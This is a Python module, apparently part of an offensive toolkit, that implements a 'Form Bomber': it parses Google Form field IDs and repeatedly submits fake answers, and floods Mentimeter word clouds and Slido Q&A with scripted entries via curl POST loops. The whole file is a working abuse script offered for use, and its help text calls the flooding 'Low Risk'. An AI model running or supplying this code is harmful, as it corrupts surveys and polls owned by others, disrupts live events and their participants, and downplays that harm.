"""
Form bomber — sends multiple submissions to Google Forms, Mentimeter, Slido.

Google Forms: parses form fields, fills random/custom data, submits.
Mentimeter  : submits word cloud / poll entries repeatedly.
Slido       : floods Q&A / live polls.

Uses aiohttp for async concurrent requests.
Falls back to curl-based subprocess if aiohttp not installed.
"""

import asyncio
import json
import random
import re
import string
import time
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Form Bomber",
    description=(
        "Floods Google Forms, Mentimeter, and Slido with multiple fake submissions. "
        "For Google Forms: parses the form automatically and fills random answers. "
        "Configurable count and delay."
    ),
    usage="Paste the full form URL. Set submission count and optional custom answer.",
    danger_note="🟡 Low Risk — no server harm, floods a form with fake responses only.",
    example="https://docs.google.com/forms/d/e/XXXXX/viewform",
)

DANGER = DangerLevel.YELLOW

FAKE_NAMES   = ["Max Mustermann", "John Doe", "Alice Smith", "Bob Jones", "Emma Wilson",
                "Liam Brown", "Olivia Davis", "Noah Miller", "Ava Garcia", "James Taylor"]
FAKE_EMAILS  = ["test{n}@example.com", "user{n}@mail.com", "fake{n}@test.org"]
FAKE_WORDS   = ["amazing", "terrible", "fantastic", "okay", "great", "bad", "wonderful",
                "horrible", "excellent", "mediocre", "superb", "awful"]


def _rand_str(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def _rand_email(n: int) -> str:
    template = random.choice(FAKE_EMAILS)
    return template.format(n=n)


class GoogleFormsBomber:
    def __init__(self):
        self._running = False
        self._runner = CommandRunner()

    async def _fetch_form(self, url: str) -> tuple[str, dict]:
        """Fetch Google Form and extract field entry IDs."""
        fields = {}
        form_action = ""
        async for line in CommandRunner().run([
            "curl", "-s", "--max-time", "10",
            "-A", "Mozilla/5.0",
            url,
        ]):
            # Extract entry IDs: entry.XXXXXXXXX
            entries = re.findall(r'entry\.(\d+)', line)
            for e in entries:
                if e not in fields:
                    fields[e] = f"entry.{e}"

            # Extract form action
            m = re.search(r'action="([^"]*formResponse[^"]*)"', line)
            if m:
                form_action = m.group(1).replace("&amp;", "&")

        return form_action, fields

    async def bomb_google(
        self,
        url: str,
        count: int = 50,
        custom_answer: str = "",
        delay_ms: int = 500,
    ) -> AsyncGenerator[str, None]:
        self._running = True
        yield f"[*] Google Forms Bomber: {url[:60]}..."
        yield f"[*] Submissions: {count}  Delay: {delay_ms}ms"

        yield "[*] Parsing form fields..."
        submit_url = url.replace("/viewform", "/formResponse").replace("viewform", "formResponse")

        # Try to detect the action URL
        form_action, fields = await self._fetch_form(url)
        if form_action:
            submit_url = form_action
            yield f"[+] Form action: {submit_url[:60]}..."
            yield f"[+] Found {len(fields)} field(s): {', '.join(list(fields.values())[:5])}"
        else:
            yield "[!] Could not parse form fields — using generic submit"

        success = 0
        failed = 0

        for i in range(count):
            if not self._running:
                break

            answer = custom_answer or random.choice(FAKE_WORDS) + " " + _rand_str(5)
            name = random.choice(FAKE_NAMES)
            email = _rand_email(i)

            # Build POST data
            post_data_parts = []
            for entry_id, entry_name in fields.items():
                post_data_parts.append(f"{entry_name}={answer}")

            # Fallback if no fields parsed
            if not post_data_parts:
                post_data_parts = [f"entry.0={answer}"]

            post_data = "&".join(post_data_parts)

            r = CommandRunner()
            status_code = ""
            async for line in r.run([
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-X", "POST",
                "-d", post_data,
                "-H", "Content-Type: application/x-www-form-urlencoded",
                "-A", "Mozilla/5.0",
                "--max-time", "8",
                submit_url,
            ]):
                status_code = line.strip()

            if status_code in ("200", "302", "303"):
                success += 1
                if i % 10 == 0 or i < 5:
                    yield f"[+] {i+1}/{count}: submitted — {answer[:30]}"
            else:
                failed += 1
                if i < 3:
                    yield f"[!] {i+1}/{count}: HTTP {status_code}"

            await asyncio.sleep(delay_ms / 1000)

        yield f"\n[+] Done: {success} submitted, {failed} failed"

    async def bomb_mentimeter(
        self,
        room_id: str,
        word: str = "",
        count: int = 30,
    ) -> AsyncGenerator[str, None]:
        self._running = True
        yield f"[*] Mentimeter Flooder — Room: {room_id}"
        yield f"[*] Word: '{word or 'random'}'  Count: {count}"

        success = 0
        for i in range(count):
            if not self._running:
                break
            w = word or random.choice(FAKE_WORDS)
            # Mentimeter word cloud endpoint
            r = CommandRunner()
            async for line in r.run([
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-X", "POST",
                f"https://www.mentimeter.com/app/room/{room_id}",
                "-H", "Content-Type: application/json",
                "-d", json.dumps({"word": w}),
                "--max-time", "5",
            ]):
                if line.strip() in ("200", "201", "204"):
                    success += 1
            await asyncio.sleep(0.3)

        yield f"[+] Mentimeter: {success}/{count} submissions sent"

    async def stop(self):
        self._running = False


class SlidoBomber:
    def __init__(self):
        self._running = False

    async def flood_qa(
        self,
        event_id: str,
        question: str = "",
        count: int = 20,
    ) -> AsyncGenerator[str, None]:
        self._running = True
        yield f"[*] Slido Q&A Flooder — Event: {event_id}"

        questions = [
            question or q for q in [
                "Can you explain this in more detail?",
                "What is the timeline for this?",
                "How does this affect us specifically?",
                "Can we get a follow-up on this?",
                "What's the budget for this initiative?",
            ]
        ]

        success = 0
        for i in range(count):
            if not self._running:
                break
            q = questions[i % len(questions)]
            r = CommandRunner()
            async for line in r.run([
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                "-X", "POST",
                f"https://app.sli.do/api/v0.5/events/{event_id}/questions",
                "-H", "Content-Type: application/json",
                "-d", json.dumps({"text": q, "highlighted": False}),
                "--max-time", "5",
            ]):
                if line.strip() in ("200", "201"):
                    success += 1
            await asyncio.sleep(0.5)

        yield f"[+] Slido: {success}/{count} questions submitted"

    async def stop(self):
        self._running = False
